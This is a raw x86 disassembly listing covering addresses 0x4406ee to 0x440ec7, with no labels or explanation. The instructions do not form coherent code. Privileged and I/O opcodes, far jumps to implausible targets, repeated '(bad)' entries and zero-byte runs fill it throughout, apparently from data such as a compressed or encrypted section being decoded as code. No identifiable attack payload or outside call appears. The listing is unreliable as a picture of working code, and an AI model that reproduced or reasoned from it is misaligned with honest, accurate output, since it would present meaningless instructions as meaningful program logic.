  4406ee:	dec    esi
  4406ef:	cld    
  4406f0:	adc    edx,DWORD PTR [edi-0x663e7aef]
  4406f6:	scas   eax,DWORD PTR es:[edi]
  4406f7:	pop    es
  4406f8:	mov    esi,DWORD PTR [ecx-0x6a]
  4406fb:	mov    edi,0x428ed445
  440700:	les    ecx,FWORD PTR [edx]
  440702:	xchg   BYTE PTR [ecx],dl
  440704:	mov    edi,0x458498b3
  440709:	iret   
  44070a:	pop    ebx
  44070c:	xchg   esp,eax
  44070d:	call   0xbf96:0xa29b0fb2
  440714:	and    eax,0x4a7f1bb2
  440719:	into   
  44071a:	es pushf 
  44071c:	mov    ebp,ecx
  44071e:	ror    BYTE PTR [ebp-0x790c08fc],0x3f
  440725:	inc    esi
  440726:	retf   
  440727:	js     0x44070b
  440729:	into   
  44072a:	pop    esp
  44072b:	aas    
  44072c:	cwde   
  44072d:	imul   esi,DWORD PTR [esi-0x7b50805e],0x2e
  440734:	pop    ss
  440735:	mov    ds:0x794c,al
  44073a:	add    BYTE PTR [eax],al
  44073c:	add    BYTE PTR [edx+0x6e],dh
  44073f:	mov    ah,0x79
  440741:	loop   0x4406fd
  440743:	and    BYTE PTR [esi],ch
  440745:	push   ecx
  440746:	mov    cl,0xf7
  440748:	add    edx,DWORD PTR [eax+0x32792cb2]
  44074e:	outs   dx,BYTE PTR ds:[esi]
  44074f:	mov    ah,0xc0
  440751:	pop    ebx
  440752:	dec    DWORD PTR [edx]
  440754:	jns    0x440791
  440756:	xor    BYTE PTR [eax+eax*1-0x33],ch
  44075a:	fs test al,0x78
  44075d:	pop    ds
  44075e:	ds mov bl,0x8f
  440761:	adc    al,0xc2
  440763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440764:	les    edx,FWORD PTR [edx-0x32]
  440767:	test   DWORD PTR [ebx],0x513fb290
  44076d:	stc    
  44076e:	retf   
  44076f:	sub    BYTE PTR [ecx-0x29],bh
  440772:	aaa    
  440773:	mov    ebx,0x342ffe8f
  440778:	or     BYTE PTR ds:0xd8375eeb,dl
  44077e:	xor    eax,0x3d9a171f
  440783:	mov    bl,0x8f
  440785:	push   esi
  440786:	ficomp DWORD PTR [edi-0x72]
  440789:	mov    eax,0x93c874cb
  44078e:	aaa    
  44078f:	and    BYTE PTR [ecx+0x52],bh
  440792:	into   
  440793:	push   cs
  440794:	push   eax
  440795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440796:	bswap  ebp
  440798:	loope  0x440734
  44079a:	pusha  
  44079b:	out    0xa8,al
  44079d:	repz mov bl,0x15
  4407a0:	rol    DWORD PTR [eax],0x0
  4407a3:	add    BYTE PTR [eax],al
  4407a5:	add    BYTE PTR [esi],dl
  4407a7:	hlt    
  4407a8:	arpl   di,sp
  4407aa:	push   es
  4407ab:	popa   
  4407ac:	jmp    0x4c6:0xe8411c3b
  4407b3:	dec    esi
  4407b4:	shl    ch,cl
  4407b6:	call   0x709dae
  4407bb:	and    al,0x1a
  4407bd:	test   DWORD PTR [ecx-0x45],edx
  4407c0:	pop    ss
  4407c1:	cmp    al,0x4
  4407c3:	or     al,0xef
  4407c5:	stc    
  4407c6:	dec    eax
  4407c7:	jecxz  0x44075c
  4407c9:	mov    al,ds:0x249bb89e
  4407ce:	and    BYTE PTR [ebx-0xa],bh
  4407d1:	sbb    eax,0x6ae9ca06
  4407d6:	push   edi
  4407d7:	scas   eax,DWORD PTR es:[edi]
  4407d8:	xchg   ebp,eax
  4407d9:	mov    eax,ds:0x50ea70a8
  4407de:	sbb    al,0xf
  4407e0:	int    0x1
  4407e2:	sbb    esp,DWORD PTR [eax-0x1a]
  4407e5:	sub    BYTE PTR [ebx],dh
  4407e7:	mov    ds:0xf40e3115,eax
  4407ec:	arpl   di,bx
  4407ee:	jle    0x440868
  4407f0:	jmp    0x1c3e:0xe89d1b98
  4407f7:	dec    esi
  4407f8:	shr    ch,cl
  4407fa:	push   0xfa495f3
  4407ff:	and    al,0x18
  440801:	lods   al,BYTE PTR ds:[esi]
  440802:	or     esi,DWORD PTR [eax]
  440804:	fcom   DWORD PTR [ebp+ecx*8+0x154437]
  44080b:	add    BYTE PTR [eax],al
  44080d:	add    BYTE PTR [eax],al
  44080f:	sbb    edx,0xca0c0f07
  440815:	lea    eax,[eax]
  440817:	gs mov bl,0x93
  44081a:	enter  0x7422,0xea
  44081e:	cdq    
  44081f:	js     0x440830
  440821:	adc    cl,BYTE PTR [ecx]
  440823:	hlt    
  440824:	ss (bad) 
  440826:	leave  
  440827:	xor    al,0xc8
  440829:	xchg   esp,eax
  44082a:	inc    ebp
  44082b:	ins    DWORD PTR es:[edi],dx
  44082c:	jg     0x440824
  44082e:	std    
  44082f:	pop    esp
  440830:	ds out 0x83,eax
  440833:	xor    eax,0x2c893b3
  440838:	je     0x440824
  44083a:	cdq    
  44083b:	cmp    BYTE PTR [edi],cl
  44083d:	sbb    cl,BYTE PTR [ecx]
  44083f:	mov    ah,0x36
  440841:	(bad)  
  440842:	leave  
  440843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440844:	loope  0x4407da
  440846:	dec    ebp
  440847:	sub    eax,0x2ce1f680
  44084c:	ds out 0x8b,eax
  44084f:	icebp  
  440850:	xor    esi,ecx
  440852:	add    al,0xb4
  440854:	pop    es
  440855:	pop    ebp
  440856:	and    edx,eax
  440858:	jae    0x440844
  44085a:	cdq    
  44085b:	mov    ds:0x314592fe,al
  440860:	loope  0x440841
  440862:	or     ebx,DWORD PTR [edx+0x2218cbef]
  440868:	and    esi,0x5f
  44086b:	sbb    dh,0x47
  44086e:	mov    DWORD PTR [ecx-0x36],ecx
  440871:	xchg   edx,eax
  440872:	rol    DWORD PTR [eax],0x0
  440875:	add    BYTE PTR [eax],al
  440877:	add    BYTE PTR [edx+0x49],al
  44087a:	in     al,dx
  44087b:	pop    ebp
  44087c:	stos   BYTE PTR es:[edi],al
  44087d:	dec    ecx
  44087e:	dec    esp
  44087f:	or     BYTE PTR [esi],cl
  440881:	pushf  
  440882:	iret   
  440883:	add    cl,bh
  440885:	mov    ch,0xe
  440887:	add    BYTE PTR [esi-0x16ffed92],dh
  44088d:	mov    ch,0xe
  44088f:	mov    edi,DWORD PTR [eax-0x67]
  440892:	xchg   ebx,eax
  440893:	in     eax,0x90
  440895:	(bad)  
  440896:	ror    bl,1
  440898:	int3   
  440899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44089a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44089b:	retf   
  44089c:	les    edi,FWORD PTR [edi-0x5a]
  44089f:	retf   
  4408a0:	fcom   QWORD PTR [edi+0x26d4cba6]
  4408a6:	imul   ebp,ebx,0x4cc9c813
  4408ac:	or     ebp,DWORD PTR [edi-0x1a]
  4408af:	push   ecx
  4408b0:	out    0x44,eax
  4408b2:	push   ss
  4408b3:	or     bl,al
  4408b5:	jmp    0x822a06c5
  4408ba:	and    DWORD PTR [ecx+0x4f],edx
  4408bd:	xchg   esi,eax
  4408be:	jle    0x4408b8
  4408c0:	outs   dx,DWORD PTR ds:[esi]
  4408c1:	fisttp DWORD PTR ds:0x6b03dd87
  4408c7:	jb     0x44093d
  4408c9:	push   edx
  4408ca:	(bad)  
  4408cb:	out    0x68,eax
  4408cd:	out    0x4f,eax
  4408cf:	add    BYTE PTR [eax+0xd13a95c],dl
  4408d5:	sbb    ebx,DWORD PTR [edx]
  4408d7:	add    eax,0xbfc199df
  4408dc:	add    BYTE PTR [eax],al
  4408de:	add    BYTE PTR [eax],al
  4408e0:	add    BYTE PTR [ebx+0x3585392d],al
  4408e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4408e7:	ror    DWORD PTR [edi+edi*4+0x33],1
  4408eb:	sbb    DWORD PTR [edx-0x70],eax
  4408ee:	fld    TBYTE PTR [eax-0xb]
  4408f1:	adc    edx,DWORD PTR [edi+0x41e884e5]
  4408f7:	fcomp  QWORD PTR ss:[ecx]
  4408fa:	fisubr WORD PTR [ebp-0x1c20007e]
  440900:	ins    DWORD PTR es:[edi],dx
  440901:	mov    BYTE PTR [edx-0x68],bl
  440904:	clc    
  440905:	out    dx,eax
  440906:	fimul  DWORD PTR ds:0x3652986d
  44090c:	hlt    
  44090d:	or     DWORD PTR [esi],edx
  44090f:	xchg   esi,eax
  440910:	test   bh,bl
  440912:	mov    cl,0x7f
  440914:	call   DWORD PTR [ebx-0x38e2084e]
  44091a:	pop    edx
  44091b:	test   DWORD PTR [edx+0x3f8c5aa2],0xf73c3590
  440925:	push   ss
  440926:	outs   dx,DWORD PTR ds:[esi]
  440927:	jmp    0x4409a8
  440929:	out    0x3d,eax
  44092b:	and    eax,0xf40bd6d6
  440930:	add    edx,DWORD PTR [eax-0x6745d34e]
  440936:	das    
  440937:	les    eax,FWORD PTR [eax+edx*4]
  44093a:	mov    dl,0x6c
  44093c:	aas    
  44093d:	test   BYTE PTR [ebp-0x6],al
  440940:	int3   
  440941:	inc    edi
  440942:	mov    eax,0xa174
  440947:	add    BYTE PTR [eax],al
  440949:	add    BYTE PTR [edi-0x38],ch
  44094c:	neg    DWORD PTR [esp+edx*4+0x3c276d22]
  440953:	cmp    al,0x23
  440955:	mov    WORD PTR [esi+ebx*2],cs
  440958:	cmp    DWORD PTR [ebp-0x26],0xffffffc2
  44095c:	pop    esp
  44095d:	pop    es
  44095e:	xor    BYTE PTR [ebx+edi*1],bh
  440961:	nop
  440962:	mov    esi,0x37fff7f4
  440967:	enter  0xb374,0x2f
  44096b:	lea    edi,[ecx-0x4c065ea]
  440971:	int3   
  440972:	dec    edi
  440973:	inc    ecx
  440974:	out    dx,eax
  440975:	jp     0x440949
  440977:	(bad)  
  440978:	pop    esi
  440979:	ltr    sp
  44097c:	icebp  
  44097d:	jp     0x4409e1
  44097f:	(bad)  
  440980:	outs   dx,BYTE PTR ds:[esi]
  440981:	aaa    
  440982:	add    BYTE PTR [ebx+esi*4],bh
  440985:	mov    ds:0xefcc40c,eax
  44098a:	cld    
  44098b:	cmp    ebx,DWORD PTR ds:0xec26aed
  440991:	add    bl,BYTE PTR [edx]
  440993:	lahf   
  440994:	shl    DWORD PTR [esp+ecx*8+0x55],1
  440998:	call   FWORD PTR [ebp-0x1a18b735]
  44099e:	mov    edi,0xfd909fe9
  4409a4:	adc    ah,ch
  4409a6:	xchg   ebx,eax
  4409a7:	mov    dl,0xf5
  4409a9:	jmp    0x440977
  4409ab:	jmp    0x44ae45
  4409b0:	add    BYTE PTR [eax],al
  4409b2:	add    BYTE PTR [edi+0x7de15c2e],bl
  4409b8:	mov    dl,0x41
  4409ba:	xchg   edi,eax
  4409bb:	arpl   WORD PTR [edi-0xa],si
  4409be:	cmp    eax,0x6a0eb2cf
  4409c3:	inc    edi
  4409c4:	mov    ds:0x578ea993,eax
  4409c9:	xchg   ebp,eax
  4409ca:	xor    al,0x8
  4409cc:	cs push esp
  4409ce:	cmc    
  4409cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4409d0:	js     0x440a10
  4409d2:	jb     0x44097a
  4409d4:	mov    edx,0x2e682195
  4409d9:	aas    
  4409da:	in     eax,0xa2
  4409dc:	leave  
  4409dd:	mov    esp,0x25b70f6a
  4409e2:	stos   BYTE PTR es:[edi],al
  4409e3:	xchg   esi,eax
  4409e4:	arpl   WORD PTR [ebx-0x30cbe8d6],bx
  4409ea:	punpcklbw mm5,DWORD PTR [esi]
  4409ed:	pop    esp
  4409ee:	test   DWORD PTR [ebx+0x32],ebp
  4409f1:	sub    esi,ecx
  4409f3:	arpl   WORD PTR [ebx+0x3],ax
  4409f6:	imul   edx,DWORD PTR [edi-0x78ddf046],0xbe58ebc
  440a00:	lds    edx,FWORD PTR [edx]
  440a02:	aam    0x90
  440a04:	xor    ch,BYTE PTR [ebx-0x1f]
  440a07:	xchg   esp,eax
  440a08:	mov    ah,0x62
  440a0a:	out    0x76,eax
  440a0c:	pop    es
  440a0d:	push   0x0
  440a0f:	mov    ah,0x26
  440a11:	pop    ss
  440a12:	cdq    
  440a13:	cli    
  440a14:	lock sbb dl,bh
  440a17:	add    BYTE PTR [eax],al
  440a19:	add    BYTE PTR [eax],al
  440a1b:	add    BYTE PTR [eax-0x78],dh
  440a1e:	repnz or ebp,DWORD PTR [ebx+0x2ce83c4c]
  440a25:	aad    0x92
  440a27:	inc    ebp
  440a28:	jno    0x440a26
  440a2a:	dec    esp
  440a2b:	lock mov dh,0x2c
  440a2e:	xor    al,0xff
  440a30:	xchg   BYTE PTR [edx],bh
  440a32:	pop    edi
  440a33:	or     al,0x22
  440a35:	and    dl,0x39
  440a38:	hlt    
  440a39:	push   ds
  440a3a:	pop    ss
  440a3b:	add    ch,0x39
  440a3e:	out    0xff,eax
  440a40:	xor    bl,BYTE PTR [eax-0x511cad16]
  440a46:	out    0x15,eax
  440a48:	aad    0xa9
  440a4a:	push   edx
  440a4b:	add    dl,dh
  440a4d:	jae    0x440a41
  440a4f:	mov    edi,DWORD PTR [esi+eiz*1-0x729e3b95]
  440a56:	inc    esp
  440a57:	pop    ebx
  440a58:	loop   0x440a6d
  440a5a:	inc    ebp
  440a5b:	ret    
  440a5c:	jl     0x440aa7
  440a5e:	cmc    
  440a5f:	adc    DWORD PTR ds:0xd48b5ad3,0xffffffc6
  440a66:	aas    
  440a67:	push   edi
  440a68:	ret    0x1abb
  440a6b:	xor    ebx,DWORD PTR [edi]
  440a6d:	test   eax,0x957f55e8
  440a72:	pop    ebx
  440a73:	(bad)  
  440a74:	jl     0x440a98
  440a76:	out    0xff,eax
  440a78:	cmp    DWORD PTR [edx+0x47a17591],esi
  440a7e:	pop    esp
  440a7f:	in     al,0x0
  440a81:	add    BYTE PTR [eax],al
  440a83:	add    BYTE PTR [eax],al
  440a85:	mov    al,0xa3
  440a87:	imul   al
  440a89:	lea    esi,[edx+0xe]
  440a8c:	add    BYTE PTR [edx-0xe],bh
  440a8f:	std    
  440a90:	test   BYTE PTR [eax+0x5704fe9b],dl
  440a96:	adc    eax,0xa9a3bfbd
  440a9b:	xor    eax,0xcd26ed85
  440aa0:	push   eax
  440aa1:	inc    ebx
  440aa2:	jae    0x440a59
  440aa4:	inc    ebx
  440aa5:	nop
  440aa6:	fisttp DWORD PTR [ebx+eax*8-0x7945bf68]
  440aad:	xchg   DWORD PTR gs:[ebx+0x52],ebp
  440ab1:	mov    al,0x56
  440ab3:	pushf  
  440ab4:	jo     0x440a58
  440ab6:	sub    esi,esp
  440ab8:	jle    0x440a65
  440aba:	lods   al,BYTE PTR ds:[esi]
  440abb:	xchg   ecx,eax
  440abc:	jmp    DWORD PTR [edi+0x3d86e548]
  440ac2:	(bad)  
  440ac3:	push   0x52
  440ac5:	cwde   
  440ac6:	push   eax
  440ac7:	jl     0x440b30
  440ac9:	xchg   esp,eax
  440aca:	xlat   BYTE PTR ds:[ebx]
  440acb:	or     eax,0x7dafa00
  440ad0:	add    BYTE PTR [edi-0x3a],bh
  440ad3:	add    eax,0x8cdbcc65
  440ad8:	ret    
  440ad9:	pushf  
  440ada:	inc    edx
  440adb:	dec    esi
  440adc:	cld    
  440add:	or     eax,0xa3b41a1b
  440ae2:	adc    bl,BYTE PTR [eax+0x3]
  440ae5:	nop
  440ae6:	fisttp DWORD PTR ds:0x35
  440aec:	add    BYTE PTR [eax],al
  440aee:	pop    esi
  440aef:	mov    esp,0xdb90f668
  440af4:	or     eax,0x27d585
  440af9:	sbb    al,0x7b
  440afb:	or     esp,ecx
  440afd:	jl     0x440b3b
  440aff:	fisttp DWORD PTR ds:0x66e93b00
  440b05:	inc    esi
  440b06:	nop
  440b07:	push   eax
  440b08:	fmul   QWORD PTR ss:[ebx]
  440b0b:	mov    esi,0xb2658495
  440b10:	inc    ebx
  440b11:	jp     0x440b6d
  440b13:	ret    0x405c
  440b16:	add    al,0x33
  440b18:	add    ecx,DWORD PTR ss:[edx+esi*4-0x4e217d09]
  440b20:	or     al,0xb6
  440b22:	jne    0x440ad8
  440b24:	mov    al,ds:0xa9e2a4ff
  440b29:	sti    
  440b2a:	push   cs
  440b2b:	outs   dx,DWORD PTR ds:[esi]
  440b2c:	sub    edi,DWORD PTR [edx+eax*2-0x3e]
  440b30:	cld    
  440b31:	cld    
  440b32:	push   cs
  440b33:	pop    edi
  440b34:	sbb    edi,DWORD PTR [edx+ecx*2-0x3e]
  440b38:	ins    BYTE PTR es:[edi],dx
  440b39:	or     BYTE PTR [eax+0x14a3b338],dh
  440b3f:	sar    DWORD PTR [eax+edx*1-0x15e2c74c],0x1a
  440b47:	ret    0xb5cc
  440b4a:	jl     0x440b39
  440b4c:	jb     0x440b11
  440b4e:	std    
  440b4f:	mov    eax,ds:0xfc48
  440b54:	add    BYTE PTR [eax],al
  440b56:	add    BYTE PTR [esi],al
  440b58:	retf   0xfff3
  440b5b:	jg     0x440b21
  440b5d:	dec    ecx
  440b5e:	std    
  440b5f:	cmp    al,0xaf
  440b61:	repz add edx,DWORD PTR [eax+0x49d8f5d7]
  440b68:	cmp    BYTE PTR [ebx],dh
  440b6a:	clc    
  440b6b:	adc    al,0x76
  440b6d:	out    dx,eax
  440b6e:	sbb    DWORD PTR [eax-0x20cbfea5],edx
  440b74:	fimul  DWORD PTR [ebx+0x41]
  440b77:	nop
  440b78:	mov    dl,0x74
  440b7a:	shl    BYTE PTR [ebx-0x58f047d3],0x37
  440b81:	and    ecx,DWORD PTR [eax+0x30e36e14]
  440b87:	(bad)  
  440b88:	bound  ebx,QWORD PTR [edi+edi*1-0x78]
  440b8c:	aaa    
  440b8d:	mov    eax,db5
  440b90:	das    
  440b91:	aas    
  440b92:	in     eax,0xc2
  440b94:	leave  
  440b95:	mov    esp,0x25b3d06a
  440b9a:	sub    cl,BYTE PTR [edi+0xeaa9b5f]
  440ba0:	xor    edi,ecx
  440ba2:	iret   
  440ba3:	fild   QWORD PTR [esi]
  440ba5:	pop    esp
  440ba6:	inc    ebp
  440ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440ba8:	xor    ch,BYTE PTR [ebx]
  440baa:	icebp  
  440bab:	mov    ds:0x8869033f,eax
  440bb0:	mov    edx,0xb89ea20f
  440bb5:	mov    fs,WORD PTR [ebp-0x6bec3a35]
  440bbb:	add    BYTE PTR [eax],al
  440bbd:	add    BYTE PTR [eax],al
  440bbf:	add    BYTE PTR [ebx+eax*2-0x4e6f1e96],bh
  440bc6:	(bad)  
  440bc7:	out    0x2e,eax
  440bc9:	add    ebp,DWORD PTR [edx+0x24]
  440bcc:	or     DWORD PTR [ebx-0x49221579],edi
  440bd2:	shl    DWORD PTR [eax+0x57],0xce
  440bd6:	adc    eax,0xf6610b2b
  440bdb:	pop    esp
  440bdc:	jp     0x440c0c
  440bde:	push   esp
  440bdf:	loope  0x440c2b
  440be1:	jo     0x440bc1
  440be3:	out    0x11,al
  440be5:	(bad)  
  440be6:	jmp    0x1a8620b9
  440beb:	jb     0x440b8b
  440bed:	mov    esi,0xb9f82c27
  440bf2:	mov    ebp,ss
  440bf4:	or     al,0xca
  440bf6:	jmp    0x95faa25d
  440bfb:	cmp    al,0x18
  440bfd:	jne    0x440c73
  440bff:	jmp    0x2beac18
  440c04:	shl    BYTE PTR [edx+0x2df02495],1
  440c0a:	pop    esp
  440c0b:	add    BYTE PTR [ecx],al
  440c0d:	dec    edx
  440c0e:	fld    DWORD PTR [ebx-0x2eed390b]
  440c14:	cs inc ebx
  440c16:	xchg   esp,eax
  440c17:	(bad)  
  440c18:	jle    0x440c48
  440c1a:	xchg   ebx,eax
  440c1b:	jne    0x440c1e
  440c1d:	test   eax,0x9639510e
  440c22:	cmp    al,0xe8
  440c24:	add    BYTE PTR [eax],al
  440c26:	add    BYTE PTR [eax],al
  440c28:	add    ch,ch
  440c2a:	jno    0x440c3a
  440c2c:	add    BYTE PTR [edx+0x3],bh
  440c2f:	inc    BYTE PTR [ecx+edi*4-0x608b7342]
  440c36:	cs out 0x8d,eax
  440c39:	and    al,0x2b
  440c3b:	pop    edx
  440c3c:	mov    esi,DWORD PTR [esi+0x4a]
  440c3f:	xlat   BYTE PTR ds:[ebx]
  440c40:	call   0x2b45ba
  440c45:	sub    al,BYTE PTR [ebx]
  440c47:	push   cs
  440c48:	test   DWORD PTR [ecx-0x42],ebp
  440c4b:	mov    WORD PTR [edi+ebx*4+0x2e],ds
  440c4f:	out    0x8d,eax
  440c51:	fsubr  QWORD PTR [edx]
  440c53:	pop    ecx
  440c54:	mov    esi,DWORD PTR [esi+0x4a]
  440c57:	xlat   BYTE PTR ds:[ebx]
  440c58:	call   0x2b45aa
  440c5d:	cli    
  440c5e:	add    DWORD PTR [esi],ecx
  440c60:	test   DWORD PTR [ecx],edi
  440c62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440c63:	lea    eax,[edi+ebx*2+0x36]
  440c67:	out    0x39,eax
  440c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440c6a:	xor    dl,BYTE PTR [edi]
  440c6c:	test   DWORD PTR [edx-0x230018cc],eax
  440c72:	fcmovnb st,st(5)
  440c74:	push   edx
  440c75:	loop   0x440ce4
  440c77:	xchg   edx,eax
  440c78:	into   
  440c79:	push   ecx
  440c7a:	mov    ds:0x39feffe3,al
  440c7f:	into   
  440c80:	add    al,0xb4
  440c82:	jbe    0x440c9a
  440c84:	test   DWORD PTR [edx+0x34],ecx
  440c87:	out    0xff,eax
  440c89:	nop
  440c8a:	push   esi
  440c8b:	xlat   BYTE PTR ds:[ebx]
  440c8c:	sti    
  440c8d:	add    BYTE PTR [eax],al
  440c8f:	add    BYTE PTR [eax],al
  440c91:	add    al,al
  440c93:	push   esp
  440c94:	push   ebp
  440c95:	test   BYTE PTR [esi+0x24],dl
  440c98:	loop   0x440c8f
  440c9a:	pop    ds
  440c9b:	inc    ecx
  440c9c:	xchg   ecx,eax
  440c9d:	ret    
  440c9e:	mov    WORD PTR [esi+0x52],cs
  440ca1:	or     BYTE PTR ds:0x7f88fd5,dl
  440ca7:	dec    ebp
  440ca8:	paddb  mm2,QWORD PTR [ecx-0xa016930]
  440caf:	push   0x6b4d848d
  440cb4:	cdq    
  440cb5:	dec    edx
  440cb6:	les    ebx,FWORD PTR [ebx]
  440cb8:	ror    DWORD PTR [esi+0x47],0x29
  440cbc:	jbe    0x440d37
  440cbe:	push   edx
  440cbf:	retf   
  440cc0:	or     eax,0x96e7d47d
  440cc5:	mov    edi,0xfa744e97
  440cca:	mov    edi,0xb4527fa0
  440ccf:	std    
  440cd0:	cwde   
  440cd1:	rcr    BYTE PTR [ebx],0xa2
  440cd4:	jp     0x440d07
  440cd6:	stos   BYTE PTR es:[edi],al
  440cd7:	mov    eax,0xd7d47c8d
  440cdc:	xchg   esi,eax
  440cdd:	mov    edi,0xfa3c4e87
  440ce2:	(bad)  
  440ce3:	rcl    BYTE PTR [edx-0x26847b86],1
  440ce9:	add    DWORD PTR [esi+0x75be96d0],edx
  440cef:	call   0x10199180
  440cf4:	in     eax,dx
  440cf5:	pop    ecx
  440cf6:	add    BYTE PTR [eax],al
  440cf8:	add    BYTE PTR [eax],al
  440cfa:	add    BYTE PTR [ebx],bl
  440cfc:	sbb    al,0xc9
  440cfe:	test   BYTE PTR [ebp-0x62],dh
  440d01:	push   ecx
  440d02:	retf   
  440d03:	inc    esp
  440d04:	sahf   
  440d05:	cdq    
  440d06:	jmp    0x440d23
  440d08:	sahf   
  440d09:	sbb    cl,BYTE PTR [ebp-0x22]
  440d0c:	mov    dl,0x5c
  440d0e:	clc    
  440d0f:	mov    ebp,DWORD PTR [ecx+0x5c]
  440d12:	dec    ecx
  440d13:	or     al,0xbb
  440d15:	lock scas eax,DWORD PTR es:[edi]
  440d17:	push   eax
  440d18:	mov    ds:0xc9e6626c,al
  440d1d:	(bad)  
  440d1e:	mov    WORD PTR [edx+0x786674aa],ds
  440d24:	sub    edi,esi
  440d26:	unpckhps xmm3,xmm2
  440d29:	enter  0xe8af,0xb6
  440d2d:	je     0x440d99
  440d2f:	mov    BYTE PTR [ecx+0x5e],dh
  440d32:	std    
  440d33:	xchg   DWORD PTR ds:0xe990bc3,ebp
  440d39:	xor    DWORD PTR [eiz*2-0x2f7b2f27],ecx
  440d40:	std    
  440d41:	lock add edx,DWORD PTR [eax+0x170c4ff3]
  440d48:	cmp    al,0xc3
  440d4a:	mov    es,WORD PTR [esi]
  440d4c:	sub    eax,0xb9ec1232
  440d51:	fadd   QWORD PTR [esi-0x3a915f29]
  440d57:	xchg   edi,eax
  440d58:	sub    eax,0xc1f41237
  440d5d:	cli    
  440d5e:	inc    esp
  440d5f:	add    BYTE PTR [eax],al
  440d61:	add    BYTE PTR [eax],al
  440d63:	add    BYTE PTR [eax-0x53bb7754],ch
  440d69:	mov    dh,0x36
  440d6b:	jno    0x440cff
  440d6d:	xor    ebx,DWORD PTR [eax]
  440d6f:	inc    edx
  440d70:	add    eax,0x570510d2
  440d75:	popa   
  440d76:	pop    esi
  440d77:	(bad)  
  440d78:	xchg   ebx,eax
  440d79:	sub    esi,ebp
  440d7b:	fmul   st(2),st
  440d7d:	repz mov edx,DWORD PTR [eax+0x5b]
  440d81:	out    dx,eax
  440d82:	mov    ds:0xbbef4b50,eax
  440d87:	push   eax
  440d88:	dec    ebx
  440d89:	out    dx,eax
  440d8a:	push   cs
  440d8b:	sbb    al,0x1d
  440d8d:	int3   
  440d8e:	lea    edi,[ebp+0x3e406f48]
  440d94:	or     eax,0x7d9e1dd0
  440d99:	in     eax,0x25
  440d9b:	sahf   
  440d9c:	daa    
  440d9d:	mov    dh,0x9b
  440d9f:	es push es
  440da1:	pop    ebx
  440da2:	dec    eax
  440da3:	and    cl,BYTE PTR ds:0x5aa4bd5
  440da9:	jb     0x440df1
  440dab:	jmp    0xaef0:0x1f9577d9
  440db2:	pop    eax
  440db3:	mov    ch,0xc
  440db5:	bound  ebx,QWORD PTR [esi]
  440db7:	mov    dh,0xe2
  440db9:	outs   dx,DWORD PTR ds:[esi]
  440dba:	cmp    al,0xbf
  440dbc:	jnp    0x440df3
  440dbe:	push   eax
  440dbf:	jmp    0xde164b57
  440dc4:	push   ss
  440dc5:	add    BYTE PTR [ebx-0x1c],ah
  440dc8:	add    BYTE PTR [eax],al
  440dca:	add    BYTE PTR [eax],al
  440dcc:	add    BYTE PTR [edi+esi*8],cl
  440dcf:	jmp    0x546f8a16
  440dd4:	xor    eax,0xd95136dc
  440dd9:	or     al,0xea
  440ddb:	imul   BYTE PTR [ecx+0x6ae9ba3a]
  440de1:	pop    eax
  440de2:	mov    bl,0x93
  440de4:	sub    DWORD PTR [eax+0x11328db4],ebp
  440dea:	xlat   BYTE PTR ds:[ebx]
  440deb:	sbb    BYTE PTR [eax-0x69],ch
  440dee:	ret    
  440def:	mov    ds:0xe45dc092,al
  440df5:	inc    esp
  440df6:	sub    dl,ch
  440df8:	out    0x10,al
  440dfa:	ss push ecx
  440dfc:	sbb    DWORD PTR [edi],eax
  440dfe:	ins    BYTE PTR es:[edi],dx
  440dff:	call   0xeb91:0xf6e91d38
  440e06:	mov    edx,0x77ea00e9
  440e0b:	or     eax,0xeac72985
  440e10:	xor    dl,0x31
  440e13:	xchg   ebx,eax
  440e14:	inc    esi
  440e15:	dec    ecx
  440e16:	xor    BYTE PTR ds:0xd82d7b90,bh
  440e1c:	call   0x2a49ea
  440e21:	mov    edx,0xf9850d77
  440e26:	(bad)  
  440e27:	jmp    0xbd45:0x9531e282
  440e2e:	jecxz  0x440dc2
  440e30:	inc    esi
  440e31:	add    BYTE PTR [eax],al
  440e33:	add    BYTE PTR [eax],al
  440e35:	add    BYTE PTR [ecx+0x2e],cl
  440e38:	fsubr  st,st(0)
  440e3a:	jno    0x440e77
  440e3c:	out    0xff,al
  440e3e:	push   0x77
  440e40:	or     eax,0xeac7a985
  440e45:	xor    BYTE PTR [edx-0x76b96cce],0x2f
  440e4c:	push   ebp
  440e4d:	cwde   
  440e4e:	clc    
  440e4f:	sub    eax,0x3b19e8d8
  440e54:	out    0xff,al
  440e56:	cmp    dh,BYTE PTR [edi+0xd]
  440e59:	test   DWORD PTR [ecx-0x39],edi
  440e5c:	jmp    0xd946:0x93328282
  440e63:	das    
  440e64:	cmp    eax,0xd82deb9c
  440e69:	call   0x2a49af
  440e6e:	sub    dh,BYTE PTR [edi+0xd]
  440e71:	test   DWORD PTR [ecx-0x39],ebp
  440e74:	jmp    0xd545:0x9332b282
  440e7b:	ficomp DWORD PTR [ecx-0x73]
  440e7e:	mov    esp,0x5791f162
  440e83:	ds out 0x8b,al
  440e86:	nop
  440e87:	lea    esp,[edx]
  440e89:	mov    edx,ebp
  440e8b:	sub    eax,esp
  440e8d:	test   BYTE PTR [esi-0x1c],cl
  440e90:	jge    0x440e89
  440e92:	push   edi
  440e93:	std    
  440e94:	(bad)  
  440e95:	ret    
  440e96:	pushf  
  440e97:	dec    esi
  440e98:	push   edx
  440e99:	jae    0x440e9b
  440e9b:	add    BYTE PTR [eax],al
  440e9d:	add    BYTE PTR [eax],al
  440e9f:	xchg   ebx,eax
  440ea0:	dec    eax
  440ea1:	push   ebp
  440ea2:	clc    
  440ea3:	or     ecx,DWORD PTR [esi+0x1fdd8b22]
  440ea9:	mov    ebp,0xe6345e84
  440eae:	mul    DWORD PTR [edi]
  440eb0:	sub    eax,0x4e94c38e
  440eb5:	push   edx
  440eb6:	jae    0x440e4b
  440eb8:	dec    eax
  440eb9:	push   ebp
  440eba:	clc    
  440ebb:	sbb    ecx,DWORD PTR [edi+0x4f558a8e]
  440ec1:	fwait
  440ec2:	inc    edx
  440ec3:	xor    al,0x41
  440ec5:	shr    BYTE PTR [edi],1
  440ec7:	popa   
